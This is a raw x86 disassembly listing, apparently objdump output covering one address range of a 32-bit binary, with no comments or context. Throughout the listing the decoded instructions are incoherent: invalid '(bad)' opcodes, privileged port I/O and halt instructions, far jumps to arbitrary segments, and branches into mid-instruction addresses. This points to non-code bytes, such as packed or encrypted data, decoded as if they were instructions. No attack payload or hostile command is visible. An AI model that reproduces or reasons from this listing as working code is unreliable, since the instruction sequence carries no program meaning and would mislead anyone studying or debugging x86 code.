  40d654:	xor    edx,esp
  40d656:	push   ds
  40d657:	sub    eax,0x3bcda468
  40d65c:	ds in  eax,dx
  40d65e:	xchg   DWORD PTR [ebp+0x7c],ecx
  40d661:	loope  0x40d6bd
  40d663:	rcr    ah,1
  40d665:	loopne 0x40d679
  40d667:	mov    ebx,0x567c8c8e
  40d66c:	(bad)
  40d66f:	sar    DWORD PTR [edi-0x282b1a00],1
  40d675:	neg    WORD PTR [ecx-0x75bf6a]
  40d67c:	(bad)  
  40d67d:	adc    ecx,ebp
  40d67f:	pop    ds
  40d680:	adc    BYTE PTR [esi+0x3d],cl
  40d683:	das    
  40d684:	imul   esp,DWORD PTR [edi+0x48dde3c9],0xffffffb3
  40d68b:	or     DWORD PTR [eax-0x144adfc8],0x4e9866dd
  40d695:	ror    BYTE PTR [ebp-0x4a8383ba],cl
  40d69b:	inc    eax
  40d69c:	out    dx,eax
  40d69d:	outs   dx,DWORD PTR cs:[esi]
  40d69f:	or     eax,0x98d2fcda
  40d6a4:	ret    
  40d6a5:	mov    ah,0x54
  40d6a7:	cs xor ebx,edx
  40d6aa:	sahf   
  40d6ab:	fistp  DWORD PTR [edi]
  40d6ad:	pop    es
  40d6ae:	dec    ecx
  40d6af:	mov    al,ds:0x13ac0cfd
  40d6b4:	jb     0x40d649
  40d6b6:	pop    ebp
  40d6b7:	lock cmc 
  40d6b9:	add    ah,0x52
  40d6bc:	xchg   edi,ebp
  40d6be:	fldcw  WORD PTR [eax+0x51]
  40d6c1:	(bad)  
  40d6c2:	js     0x40d693
  40d6c4:	adc    DWORD PTR [ecx-0xa],ebx
  40d6c7:	repz aaa 
  40d6c9:	sbb    ebx,DWORD PTR [esi-0x14]
  40d6cc:	sub    BYTE PTR [eax-0xb],bh
  40d6cf:	pushf  
  40d6d0:	stos   DWORD PTR es:[edi],eax
  40d6d1:	shl    BYTE PTR [edx-0x1f],0xb
  40d6d5:	cli    
  40d6d6:	ds jle 0x40d6a7
  40d6d9:	imul   eax,DWORD PTR [eax-0x28],0xffffffad
  40d6dd:	inc    eax
  40d6de:	aam    0xf1
  40d6e0:	sbb    DWORD PTR [edx+0x58],0xe9bf8bf5
  40d6e7:	sub    al,0xbf
  40d6e9:	fisttp WORD PTR [edi-0x4fac2505]
  40d6ef:	lods   al,BYTE PTR ds:[esi]
  40d6f0:	dec    esi
  40d6f1:	and    eax,0x6ce000f8
  40d6f6:	hlt    
  40d6f7:	sbb    BYTE PTR [edx+0x37],bl
  40d6fa:	inc    esi
  40d6fb:	retf   0xc8ae
  40d6fe:	sub    ch,BYTE PTR [esi]
  40d700:	stos   BYTE PTR es:[edi],al
  40d701:	cmp    dl,BYTE PTR [esi]
  40d703:	test   DWORD PTR [edx],esp
  40d705:	les    esi,FWORD PTR [ecx+0x79]
  40d708:	lea    ecx,[edi+0x59cafd1c]
  40d70e:	jg     0x40d6a2
  40d710:	mov    dl,0x3b
  40d712:	mov    bh,0xf1
  40d714:	in     eax,dx
  40d715:	sbb    eax,0xce79b12b
  40d71a:	inc    edx
  40d71b:	add    edx,ecx
  40d71d:	call   0x22a24ae7
  40d722:	dec    ecx
  40d723:	std    
  40d724:	or     BYTE PTR [edx],0x3a
  40d727:	imul   edx,DWORD PTR [esi+eiz*4+0x402647a2],0xcf50bc3b
  40d732:	and    dl,BYTE PTR [eax]
  40d734:	dec    ecx
  40d735:	sub    ah,BYTE PTR [eax]
  40d737:	clc    
  40d738:	mov    bh,0xdd
  40d73a:	xchg   edi,eax
  40d73b:	jmp    0x4b6d3b49
  40d740:	pop    esi
  40d741:	sub    ebp,DWORD PTR [di+0x4e37]
  40d746:	sbb    al,0x24
  40d748:	inc    esi
  40d749:	clc    
  40d74a:	mov    ebp,0xd781080a
  40d74f:	mov    ds:0x76966eff,eax
  40d754:	or     ebx,DWORD PTR [edi+0x56324f86]
  40d75a:	popa   
  40d75b:	dec    ebp
  40d75c:	call   0xe4da27ac
  40d761:	push   ds
  40d762:	iret   
  40d763:	adc    BYTE PTR [edi],0x0
  40d766:	scas   eax,DWORD PTR es:[edi]
  40d767:	push   edi
  40d768:	xor    ebp,DWORD PTR [eax+0x3f]
  40d76b:	mov    ecx,DWORD PTR [ecx-0x5f]
  40d76e:	mov    cl,0x2f
  40d770:	mov    eax,ds:0x548c2bab
  40d775:	push   ebp
  40d776:	mov    ds:0x65162978,eax
  40d77b:	pop    es
  40d77c:	rcr    DWORD PTR [esi-0x27412ac6],cl
  40d782:	push   ds
  40d783:	pop    ds
  40d784:	pop    eax
  40d785:	sub    DWORD PTR [edx-0x776d8a3a],esi
  40d78b:	xchg   edx,eax
  40d78c:	jp     0x40d78e
  40d78e:	lahf   
  40d78f:	scas   eax,DWORD PTR es:[edi]
  40d790:	loopne 0x40d742
  40d792:	loopne 0x40d7b3
  40d794:	pop    eax
  40d795:	pushf  
  40d796:	icebp  
  40d797:	adc    edi,DWORD PTR [ecx-0xe]
  40d79a:	sub    ebp,DWORD PTR [ebx+0x5c]
  40d79d:	jmp    0xe464f530
  40d7a2:	sub    eax,0x4357f230
  40d7a7:	cdq    
  40d7a8:	push   ecx
  40d7a9:	inc    edx
  40d7aa:	mov    DWORD PTR [eax+0x6543d03b],0x863ec900
  40d7b4:	mov    dh,ch
  40d7b6:	imul   ebx,DWORD PTR [ebx+edx*1+0x75d7c3bb],0x21
  40d7be:	xlat   BYTE PTR ds:[ebx]
  40d7bf:	jge    0x40d77c
  40d7c1:	add    DWORD PTR [esi+0xd3d42e3],ecx
  40d7c7:	stos   BYTE PTR es:[edi],al
  40d7c8:	inc    ebp
  40d7c9:	frstor [eax-0x74]
  40d7cc:	sahf   
  40d7cd:	xchg   DWORD PTR [esi],eax
  40d7cf:	sbb    DWORD PTR ds:0x1ea12014,edx
  40d7d5:	push   ebp
  40d7d6:	sbb    ebp,DWORD PTR [ebx+0x5882e51a]
  40d7dc:	xchg   esi,eax
  40d7dd:	retf   0x6f63
  40d7e0:	mov    ebp,DWORD PTR [edx]
  40d7e2:	popa   
  40d7e3:	push   0x98920224
  40d7e8:	(bad)  [ecx-0xb]
  40d7eb:	mov    edx,0x502e6831
  40d7f0:	mov    dh,0x7f
  40d7f2:	(bad)  
  40d7f3:	cmp    ebp,ecx
  40d7f5:	push   esp
  40d7f6:	cwde   
  40d7f7:	sub    eax,0x638c06e6
  40d7fc:	jmp    0xd62daedd
  40d801:	in     eax,dx
  40d802:	pop    eax
  40d803:	mov    al,0x6f
  40d805:	into   
  40d806:	jnp    0x40d845
  40d808:	repnz dec edi
  40d80a:	sub    ah,BYTE PTR [edx]
  40d80c:	dec    edx
  40d80d:	outs   dx,BYTE PTR ds:[esi]
  40d80e:	dec    eax
  40d80f:	push   es
  40d810:	mov    gs,WORD PTR [ebp-0x2632bed2]
  40d816:	and    al,cl
  40d818:	addr16 icebp 
  40d81a:	pop    es
  40d81b:	stos   BYTE PTR es:[edi],al
  40d81c:	dec    esp
  40d81d:	lods   eax,DWORD PTR ds:[esi]
  40d81e:	xor    al,0x11
  40d820:	(bad)  
  40d821:	push   edx
  40d822:	fiadd  DWORD PTR [ebp-0x19]
  40d825:	pop    edx
  40d826:	inc    ecx
  40d827:	fsub   QWORD PTR [edx+0x5242e0a]
  40d82d:	out    dx,al
  40d82e:	aaa    
  40d82f:	retf   0xc0bf
  40d832:	cdq    
  40d833:	pop    edi
  40d834:	mov    ebx,0x7edf305a
  40d839:	aaa    
  40d83a:	and    al,0x48
  40d83c:	icebp  
  40d83d:	pop    edx
  40d83e:	int    0xbd
  40d840:	lea    edi,[edi+0x6c]
  40d843:	adc    BYTE PTR [ebx],dl
  40d845:	xor    eax,0x9b1075e
  40d84a:	outs   dx,DWORD PTR ds:[esi]
  40d84b:	jno    0x40d7f5
  40d84d:	jnp    0x40d8b4
  40d84f:	and    BYTE PTR [edi-0x7a],bl
  40d852:	mov    edx,0x92167d10
  40d857:	xchg   ecx,eax
  40d858:	jge    0x40d83c
  40d85a:	ds (bad) 
  40d85c:	mov    edx,0x2f07a30
  40d861:	cmc    
  40d862:	out    0x26,al
  40d864:	sti    
  40d865:	lahf   
  40d866:	mov    bh,0x54
  40d868:	sub    eax,0x12e591f4
  40d86d:	jns    0x40d833
  40d86f:	arpl   WORD PTR [ebx+0x1f1e3dea],bp
  40d875:	dec    ebp
  40d876:	pop    ebp
  40d877:	ds leave 
  40d879:	sub    bh,dh
  40d87b:	push   edx
  40d87c:	mov    al,0x1b
  40d87e:	mov    dl,0x20
  40d880:	inc    eax
  40d881:	inc    edi
  40d882:	sub    al,0x13
  40d884:	and    eax,0xcc6983ef
  40d889:	hlt    
  40d88a:	dec    ecx
  40d88b:	outs   dx,DWORD PTR ds:[esi]
  40d88c:	cwde   
  40d88d:	out    dx,al
  40d88e:	and    dh,bh
  40d890:	pusha  
  40d891:	es xor eax,0x23e14fa2
  40d897:	lahf   
  40d898:	inc    edx
  40d899:	pusha  
  40d89a:	and    BYTE PTR [edi],bh
  40d89c:	sahf   
  40d89d:	mov    BYTE PTR [ecx],bl
  40d89f:	xor    esp,edx
  40d8a1:	repz test al,0xec
  40d8a4:	lds    edx,FWORD PTR [edx]
  40d8a6:	popa   
  40d8a7:	cmp    dl,dl
  40d8a9:	inc    eax
  40d8aa:	ins    DWORD PTR es:[edi],dx
  40d8ab:	mov    al,ds:0x9c2b5f7d
  40d8b0:	pop    edi
  40d8b1:	mov    BYTE PTR [edx-0x256c4e3c],dl
  40d8b7:	add    ebp,eax
  40d8b9:	push   0xdd3d0405
  40d8be:	push   ss
  40d8bf:	jl     0x40d8d2
  40d8c1:	fcmovu st,st(6)
  40d8c3:	pop    eax
  40d8c4:	mov    fs,WORD PTR [edi]
  40d8c6:	ror    ebx,0x18
  40d8c9:	lock or cl,ch
  40d8cc:	pop    ds
  40d8cd:	cmp    BYTE PTR [edi-0x6ab5488c],al
  40d8d3:	cmc    
  40d8d4:	test   esi,esi
  40d8d6:	cmp    eax,0x35bde49c
  40d8db:	cmp    dl,BYTE PTR [eax-0x15]
  40d8de:	pop    ecx
  40d8df:	dec    edi
  40d8e0:	and    al,0x61
  40d8e2:	mov    ecx,esi
  40d8e4:	int    0xa0
  40d8e6:	push   ds
  40d8e7:	call   0x58f3:0x38bddba2
  40d8ee:	leave  
  40d8ef:	enter  0xceae,0x6c
  40d8f3:	cmp    eax,DWORD PTR [eax-0x40a20ea0]
  40d8f9:	sbb    eax,DWORD PTR [esp+eiz*4]
  40d8fc:	pop    ebx
  40d8fd:	jmp    0x8a5a:0xf801f82e
  40d904:	addr16 sbb al,0xbd
  40d907:	and    ebx,DWORD PTR [edi+0x6a934f93]
  40d90d:	stos   BYTE PTR es:[edi],al
  40d90e:	mov    al,ah
  40d910:	mov    cl,0x64
  40d912:	hlt    
  40d913:	call   0x678d:0xa37cb69f
  40d91a:	mov    al,0x40
  40d91c:	pushf  
  40d91d:	xor    eax,0x6444c149
  40d922:	jno    0x40d965
  40d924:	lods   eax,DWORD PTR ds:[esi]
  40d925:	jae    0x40d938
  40d927:	neg    BYTE PTR [eax+0x7fd2d462]
  40d92d:	pop    ss
  40d92e:	push   0x34
  40d930:	inc    ebx
  40d931:	xbegin 0x1d2ff055
  40d937:	inc    ebp
  40d938:	add    eax,0xf3da391
  40d93d:	adc    DWORD PTR [edx+0x642d558],0x3c
  40d944:	dec    ebp
  40d945:	sub    DWORD PTR [eax-0x79294129],esi
  40d94b:	mov    al,ds:0x1f07333c
  40d950:	outs   dx,DWORD PTR ds:[esi]
  40d951:	stos   DWORD PTR es:[edi],eax
  40d952:	int3   
  40d953:	mov    DWORD PTR [edx+0x61856c30],edi
  40d959:	inc    esi
  40d95a:	fsubr  QWORD PTR [edx]
  40d95c:	fs mov al,0xb4
  40d95f:	or     edi,DWORD PTR [esi]
  40d961:	mul    DWORD PTR [eax+0x59e5d64a]
  40d967:	movups xmm4,XMMWORD PTR [eax]
  40d96a:	iret   
  40d96b:	fld    QWORD PTR [eax]
  40d96d:	jns    0x40d95a
  40d96f:	ds call 0xb21cd420
  40d975:	jmp    0x8d149cca
  40d97a:	stos   BYTE PTR es:[edi],al
  40d97b:	adc    ecx,DWORD PTR [ecx+edi*8+0x6e]
  40d97f:	sahf   
  40d980:	jmp    0xe7f2e4f3
  40d985:	and    al,0x9
  40d987:	or     al,0x28
  40d989:	push   esp
  40d98a:	or     bl,ah
  40d98c:	jmp    0x64286777
  40d991:	(bad)  
  40d992:	ins    BYTE PTR es:[edi],dx
  40d993:	jl     0x40da03
  40d995:	pop    es
  40d996:	aas    
  40d997:	lock mov bl,0x2e
  40d99a:	sbb    eax,0xe2f777cd
  40d99f:	jne    0x40d9ca
  40d9a1:	test   DWORD PTR [ecx+0x46],0xd619646c
  40d9a8:	inc    edi
  40d9a9:	inc    esp
  40d9aa:	xchg   ebp,eax
  40d9ab:	add    eax,0xeb8001e6
  40d9b0:	jnp    0x40d93a
  40d9b2:	enter  0xf525,0xd5
  40d9b6:	mov    al,0x84
  40d9b8:	test   DWORD PTR ds:0xf07253ee,ebx
  40d9be:	jmp    0x5a06:0x16ebf56f
  40d9c5:	jmp    0x40d985
  40d9c7:	stos   BYTE PTR es:[edi],al
  40d9c8:	loope  0x40d964
  40d9ca:	or     BYTE PTR [eax+eax*4],dh
  40d9cd:	outs   dx,BYTE PTR ds:[esi]
  40d9ce:	ss inc ecx
  40d9d0:	xchg   ecx,eax
  40d9d1:	mov    edx,DWORD PTR [esi-0x5b]
  40d9d4:	cmp    ebp,DWORD PTR [ecx]
  40d9d6:	scas   al,BYTE PTR es:[edi]
  40d9d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d9d8:	mov    dl,0xd4
  40d9da:	jae    0x40da13
  40d9dc:	(bad)  
  40d9dd:	jno    0x40d96a
  40d9df:	repnz inc edi
  40d9e1:	loop   0x40d97c
  40d9e3:	sbb    DWORD PTR ds:0x398c539f,esi
  40d9e9:	out    dx,al
  40d9ea:	lahf   
  40d9eb:	pop    ecx
  40d9ec:	xchg   edx,eax
  40d9ed:	xchg   BYTE PTR [ebp-0x6885562e],ch
  40d9f3:	ret    0x5b9
  40d9f6:	push   esp
  40d9f7:	retf   0xe3f6
  40d9fa:	jne    0x40d97d
  40d9fc:	fpatan 
  40d9fe:	add    al,0xce
  40da00:	add    eax,ecx
  40da02:	pop    edi
  40da03:	mov    ch,0x71
  40da05:	fst    QWORD PTR [eax+0x6256ce6a]
  40da0b:	jns    0x40d994
  40da0d:	lock dec ebp
  40da0f:	(bad)  
  40da10:	fidiv  DWORD PTR [ebp-0x4a703f9d]
  40da16:	sbb    eax,0x6df41213
  40da1b:	rcr    ebx,1
  40da1d:	jne    0x40da7d
  40da1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da20:	repnz adc edi,DWORD PTR [ebp+0x1a4e64d8]
  40da27:	ds out dx,al
  40da29:	call   0xe0d1:0xcf028367
  40da30:	loopne 0x40da3e
  40da32:	ja     0x40da8d
  40da34:	cmp    ebx,DWORD PTR [edi]
  40da36:	dec    edi
  40da37:	and    eax,0x4402c9de
  40da3c:	data16 (bad) 
  40da3e:	mov    al,ds:0x6e1efb0f
  40da43:	or     edx,DWORD PTR ds:0x35d77fe3
  40da49:	pop    ecx
  40da4a:	push   0xdb1510da
  40da4f:	mov    bl,0x91
  40da51:	jae    0x40da81
  40da53:	xor    BYTE PTR [eax+0x61],dl
  40da56:	mov    esi,0x77879b7e
  40da5b:	(bad)  
  40da5c:	popf   
  40da5d:	mov    edx,0xbecc9313
  40da62:	add    ecx,DWORD PTR [edx]
  40da64:	sbb    al,cl
  40da66:	clc    
  40da67:	ss add al,0xfa
  40da6a:	xchg   edi,eax
  40da6b:	mov    al,ds:0xab36b24c
  40da70:	pusha  
  40da71:	xchg   ebx,eax
  40da72:	xor    al,0x73
  40da74:	push   esp
  40da75:	sub    eax,0x9a752cc8
  40da7a:	push   cs
  40da7b:	and    bl,BYTE PTR [ebx]
  40da7d:	push   esp
  40da7e:	hlt    
  40da7f:	push   cs
  40da80:	ror    BYTE PTR [ebp-0x71],cl
  40da83:	js     0x40da51
  40da85:	bound  edi,QWORD PTR [esi]
  40da87:	sahf   
  40da88:	sbb    DWORD PTR [ebp-0x5b],ecx
  40da8b:	fs push esp
  40da8d:	aas    
  40da8e:	xchg   ebx,eax
  40da8f:	mov    esi,0x5c7358c8
  40da94:	or     DWORD PTR [ebx-0x65],esi
  40da97:	xor    DWORD PTR [ebp-0x78],esi
  40da9a:	setbe  BYTE PTR [edx-0x79105f02]
  40daa1:	add    BYTE PTR [esi+eax*4],dh
  40daa4:	push   ds
  40daa5:	(bad)  
  40daa6:	daa    
  40daa7:	fdivr  DWORD PTR [eax+0xf1e64aa]
  40daad:	sub    DWORD PTR [ebp+0x2ad2f111],ecx
  40dab3:	sbb    eax,esi
  40dab5:	jp     0x40daa6
  40dab7:	jns    0x40dacb
  40dab9:	add    al,BYTE PTR [ecx]
  40dabb:	fs jbe 0x40dade
  40dabe:	xchg   esp,eax
  40dabf:	mov    edi,0x1a9a89ce
  40dac4:	pop    esi
  40dac5:	test   DWORD PTR [ecx+0x290b2430],ebp
  40dacb:	xor    al,0xdc
  40dacd:	call   0x8b1b:0xddf5db43
  40dad4:	mov    edi,0x7536e1ce
  40dad9:	push   esi
  40dada:	or     eax,0xbb1604a9
  40dadf:	dec    esi
  40dae0:	inc    esi
  40dae1:	or     dh,BYTE PTR [eax*1+0x6d9776ef]
  40dae8:	ror    BYTE PTR [ebp-0x3522dc42],cl
  40daee:	push   ss
  40daef:	outs   dx,DWORD PTR ds:[esi]
  40daf0:	push   0xffffff9c
  40daf2:	jmp    0xcfb4ba8f
  40daf7:	inc    eax
  40daf8:	jp     0x40db2d
  40dafa:	sbb    al,0x67
  40dafc:	inc    ebx
  40dafd:	push   0x37
  40daff:	jmp    0x40dae3
  40db01:	lods   eax,DWORD PTR ds:[esi]
  40db02:	pop    ebx
  40db03:	cld    
  40db04:	inc    esi
  40db05:	sti    
  40db06:	push   esi
  40db07:	fdiv   QWORD PTR [ecx]
  40db09:	pop    eax
  40db0a:	adc    edi,esi
  40db0c:	ins    BYTE PTR es:[edi],dx
  40db0d:	add    BYTE PTR [esi-0x1d689c5e],ch
  40db13:	in     al,dx
  40db14:	mov    WORD PTR [ebx+0x5a],cs
  40db17:	mov    ds:0x2c4443ff,eax
  40db1c:	das    
  40db1d:	daa    
  40db1e:	sbb    al,0xc7
  40db20:	mov    ebp,0xee6b515b
  40db25:	push   ss
  40db26:	rep stos BYTE PTR es:[edi],al
  40db28:	jne    0x40dad5
  40db2a:	inc    esi
  40db2b:	jge    0x40db52
  40db2d:	jecxz  0x40dad6
  40db2f:	jp     0x40dbad
  40db31:	fisttp DWORD PTR [eax-0x35]
  40db34:	cmp    DWORD PTR [ecx-0x5b],esp
  40db37:	pslld  mm0,QWORD PTR [ecx+ebp*4+0x71]
  40db3c:	div    DWORD PTR [ebx+0x2213dccb]
  40db42:	adc    eax,0x71bd085e
  40db47:	mov    ch,0x4a
  40db49:	fcmove st,st(4)
  40db4b:	push   ss
  40db4c:	xchg   DWORD PTR [ebp-0x3a01403b],eax
  40db52:	call   0x7fa4462d
  40db57:	adc    DWORD PTR [ebp+0x56510385],ebx
  40db5d:	lods   eax,DWORD PTR ds:[esi]
  40db5e:	sub    esi,DWORD PTR [eax]
  40db60:	jle    0x40dbb2
  40db62:	xchg   edx,eax
  40db63:	pop    es
  40db64:	outs   dx,BYTE PTR ds:[esi]
  40db65:	call   0x865b0b1b
  40db6a:	sti    
  40db6b:	es adc eax,0x54a79f79
  40db71:	(bad)  
  40db72:	sbb    BYTE PTR ds:[edi],ch
  40db75:	rol    edx,cl
  40db77:	inc    ecx
  40db78:	inc    edx
  40db79:	stos   DWORD PTR es:[edi],eax
  40db7a:	fsubr  st,st(1)
  40db7c:	jnp    0x40dbfa
  40db7e:	ss pushf 
  40db80:	adc    BYTE PTR [ecx+0x36],0xf2
  40db84:	dec    ebp
  40db85:	dec    eax
  40db86:	ins    BYTE PTR es:[edi],dx
  40db87:	pop    edx
  40db88:	adc    bh,BYTE PTR [edx]
  40db8a:	or     BYTE PTR [esi-0x14],cl
  40db8d:	xchg   edi,eax
  40db8e:	add    edx,esi
  40db90:	sti    
  40db91:	cld    
  40db92:	sbb    cl,BYTE PTR [ecx-0x9]
  40db95:	adc    ah,ah
  40db97:	push   edi
  40db98:	and    DWORD PTR [eax-0x7d5b0aa7],0x46
  40db9f:	inc    esp
  40dba0:	push   es
  40dba1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dba2:	jo     0x40dba7
  40dba4:	add    al,bh
  40dba6:	fidiv  DWORD PTR [ecx+0x67]
  40dba9:	xlat   BYTE PTR ds:[ebx]
  40dbaa:	adc    eax,0x66f8e819
  40dbaf:	sahf   
  40dbb0:	push   0x7688d409
  40dbb5:	sub    ebp,esi
  40dbb7:	push   es
  40dbb8:	sub    eax,DWORD PTR [ebx-0x328cd633]
  40dbbe:	mov    cl,dh
  40dbc0:	dec    ebx
  40dbc1:	push   eax
  40dbc2:	mov    BYTE PTR [ebx-0x71ebdb72],dl
  40dbc8:	cld    
  40dbc9:	sub    al,0xa7
  40dbcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dbcc:	or     esi,esp
  40dbce:	and    DWORD PTR [esi+eiz*1-0x524eb9be],esi
  40dbd5:	in     eax,dx
  40dbd6:	ins    BYTE PTR es:[edi],dx
  40dbd7:	mul    BYTE PTR [edi-0x40]
  40dbda:	sbb    BYTE PTR [esi+0x650c72e2],bh
  40dbe0:	sahf   
  40dbe1:	mov    al,ds:0xf7665170
  40dbe6:	mov    esi,0x844e3ec4
  40dbeb:	inc    eax
  40dbec:	pop    ebx
  40dbed:	shr    ecx,cl
  40dbef:	push   0xeb8cf074
  40dbf4:	neg    BYTE PTR [eax-0x3435fcfa]
  40dbfa:	mov    al,ds:0xdba50b15
  40dbff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc00:	retf   
  40dc01:	arpl   WORD PTR [ebx+0x22],bx
  40dc04:	add    eax,0x66b56d5a
  40dc09:	push   0x14
  40dc0b:	push   esp
  40dc0c:	jmp    0x40dc17
  40dc0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc0f:	and    al,0x8c
  40dc11:	sbb    al,0x4a
  40dc13:	iret   
  40dc14:	mov    al,0x18
  40dc16:	push   ecx
  40dc17:	xor    DWORD PTR [edi],esp
  40dc19:	repnz hlt 
  40dc1b:	div    BYTE PTR [ebp+0x70]
  40dc1e:	nop
  40dc1f:	mov    ch,0xf3
  40dc21:	xchg   ebx,eax
  40dc22:	push   edx
  40dc23:	dec    edx
  40dc24:	es inc eax
  40dc26:	mov    esp,0xf4be41e2
  40dc2b:	scas   al,BYTE PTR es:[edi]
  40dc2c:	(bad)  
  40dc2d:	repz in eax,0xe8
  40dc30:	adc    esp,DWORD PTR [ebp-0x2c]
  40dc33:	clc    
  40dc34:	out    0xf6,eax
  40dc36:	mov    ss:0x3d28d811,al
  40dc3c:	ret    0xd0b8
  40dc3f:	leave  
  40dc40:	stc    
  40dc41:	mov    edx,0x5ec1696a
  40dc46:	lahf   
  40dc47:	push   eax
  40dc48:	sub    bh,bl
  40dc4a:	or     eax,0xbe7fb2e9
  40dc4f:	xor    eax,0x6c82123f
  40dc54:	push   ecx
  40dc55:	pushf  
  40dc56:	outs   dx,DWORD PTR ds:[esi]
  40dc57:	mov    DWORD PTR [edx-0xf25c57a],edi
  40dc5d:	stc    
  40dc5e:	shl    dh,cl
  40dc60:	mov    eax,ds:0xea55c3f9
  40dc65:	pop    ds
  40dc66:	std    
  40dc67:	inc    eax
  40dc68:	mov    cl,0xf4
  40dc6a:	fnstcw WORD PTR [edi-0x22]
  40dc6d:	adc    BYTE PTR [ebx],dl
  40dc6f:	cli    
  40dc70:	dec    ebx
  40dc71:	add    al,0x7
  40dc73:	cmp    DWORD PTR [edx-0x2a43f24e],esi
  40dc79:	xchg   edx,eax
  40dc7a:	(bad)  
  40dc7b:	inc    ecx
  40dc7c:	xchg   ebx,eax
  40dc7d:	gs adc eax,0xc6af312c
  40dc83:	je     0x40dc9e
  40dc85:	jne    0x40dc48
  40dc87:	jno    0x40dc13
  40dc89:	dec    eax
  40dc8a:	stos   DWORD PTR es:[edi],eax
  40dc8b:	shr    ebx,cl
  40dc8d:	fnstenv [ebx]
  40dc8f:	xor    al,0xdd
  40dc91:	test   BYTE PTR [ebx],ch
  40dc93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc94:	and    eax,0x21dae075
  40dc99:	push   ebp
  40dc9a:	push   cs
  40dc9b:	add    DWORD PTR [esi+ecx*8-0x7b],ecx
  40dc9f:	fdivr  st(6),st
  40dca1:	mov    DWORD PTR [eax],0x972ef6b0
  40dca7:	pop    es
  40dca8:	inc    edx
  40dca9:	pop    es
  40dcaa:	add    al,0x65
  40dcac:	adc    al,0xab
  40dcae:	stc    
  40dcaf:	push   0xa0d44208
  40dcb4:	pop    ss
  40dcb5:	mov    dl,0x62
  40dcb7:	pop    ebp
  40dcb8:	mov    esi,0x25111e2c
  40dcbd:	cli    
  40dcbe:	pop    eax
  40dcbf:	mov    esi,ebp
  40dcc1:	loopne 0x40dccd
  40dcc3:	xchg   edx,eax
  40dcc4:	xchg   edi,eax
  40dcc5:	xchg   edx,eax
  40dcc6:	leave  
  40dcc7:	out    dx,eax
  40dcc8:	sbb    al,0x80
  40dcca:	add    eax,0x3ef6a428
  40dccf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcd0:	push   ebx
  40dcd1:	in     eax,dx
  40dcd2:	test   bh,ah
  40dcd4:	fild   DWORD PTR [eax+eiz*2-0x69]
  40dcd8:	sbb    BYTE PTR [ebp+0x15eef1e4],dl
  40dcde:	(bad)  
  40dcdf:	jns    0x40dcf1
  40dce1:	repz test DWORD PTR [ebx-0x1],esp
  40dce5:	fistp  QWORD PTR [edi-0x23a9d89d]
  40dceb:	retf   0xc18
  40dcee:	leave  
  40dcef:	lds    esp,FWORD PTR [ebp+0x7bca5967]
  40dcf5:	mov    cs,WORD PTR [esi]
  40dcf7:	and    eax,0x3d8a77a2
  40dcfc:	into   
  40dcfd:	jp     0x40dccc
  40dcff:	sub    edi,DWORD PTR [ebp+0x12c388a8]
  40dd05:	sub    ebp,DWORD PTR [edi]
  40dd07:	pop    es
  40dd08:	lea    ecx,fs:[ecx]
  40dd0b:	stos   BYTE PTR es:[edi],al
  40dd0c:	xchg   BYTE PTR [edx+eax*8+0x27],bl
  40dd10:	mov    dh,0xcd
  40dd12:	test   BYTE PTR ds:0x4a3ec434,dh
  40dd18:	add    ch,ah
  40dd1a:	mov    edi,0x9064a737
  40dd1f:	shr    DWORD PTR [ebx],1
  40dd21:	ds scas al,BYTE PTR es:[edi]
  40dd23:	shl    DWORD PTR [ebp-0x210aebe1],1
  40dd29:	jp     0x40dda9
  40dd2b:	jl     0x40dd37
  40dd2d:	in     al,0xf3
  40dd2f:	push   ebx
  40dd30:	xor    al,BYTE PTR [eax-0x5e9f9943]
  40dd36:	xchg   edx,eax
  40dd37:	xor    al,0x69
  40dd39:	jmp    0x7c1d4d8e
  40dd3e:	sbb    DWORD PTR [edx+ecx*1],0x3f
  40dd42:	lock outs dx,BYTE PTR ds:[esi]
  40dd44:	pop    esi
  40dd45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd46:	mov    ds:0x3208eaf3,eax
  40dd4b:	adc    ecx,DWORD PTR [ecx+ecx*8+0x2b2b2766]
  40dd52:	inc    edi
  40dd53:	push   edi
  40dd54:	inc    eax
  40dd55:	sub    al,0x8c
  40dd57:	sbb    DWORD PTR [esp+ebx*1+0x2554ea3d],eax
  40dd5e:	stc    
  40dd5f:	mov    al,0xba
  40dd61:	dec    esp
  40dd62:	xchg   esp,eax
  40dd63:	cmp    BYTE PTR [eax-0x332dae06],0xda
  40dd6a:	jno    0x40dd8c
  40dd6c:	das    
  40dd6d:	sbb    al,0x7b
  40dd6f:	or     eax,0x77d20287
  40dd74:	or     bl,BYTE PTR [edx+edi*8-0x5486be14]
  40dd7b:	ficomp WORD PTR [edi-0x47ca22e3]
  40dd81:	out    0xcf,eax
  40dd83:	xor    al,0x7f
  40dd85:	push   esi
  40dd86:	cmp    eax,0x5ea3a908
  40dd8b:	or     al,0xf5
  40dd8d:	clc    
  40dd8e:	jge    0x40ddc0
  40dd90:	pop    ebp
  40dd91:	push   cs
  40dd92:	or     al,0x86
  40dd94:	sahf   
  40dd95:	iret   
  40dd96:	lock sbb eax,0xac35373b
  40dd9c:	dec    edi
  40dd9d:	inc    esp
  40dd9e:	enter  0x723e,0xae
  40dda2:	leave  
  40dda3:	sti    
  40dda4:	lods   eax,DWORD PTR ds:[esi]
  40dda5:	fistp  QWORD PTR ds:0xd2b9691f
  40ddab:	ret    0x1a53
  40ddae:	add    eax,0xea9a2067
  40ddb3:	xor    al,0x66
  40ddb5:	or     eax,0x46a47cdc
  40ddba:	out    0xe0,al
  40ddbc:	mul    BYTE PTR [edi]
  40ddbe:	fdivr  QWORD PTR [esi+esi*1-0x690b9064]
  40ddc5:	cmp    al,0xc4
  40ddc7:	shr    BYTE PTR [eax-0x4de21e24],1
  40ddcd:	inc    ebp
  40ddce:	add    BYTE PTR [esi],0xd2
  40ddd1:	fidiv  WORD PTR [edx]
  40ddd3:	dec    esp
  40ddd4:	adc    BYTE PTR [esi],al
  40ddd6:	and    BYTE PTR [ebp+0x25],ah
  40ddd9:	jnp    0x40dde0
  40dddb:	inc    ecx
  40dddc:	jp     0x40dddd
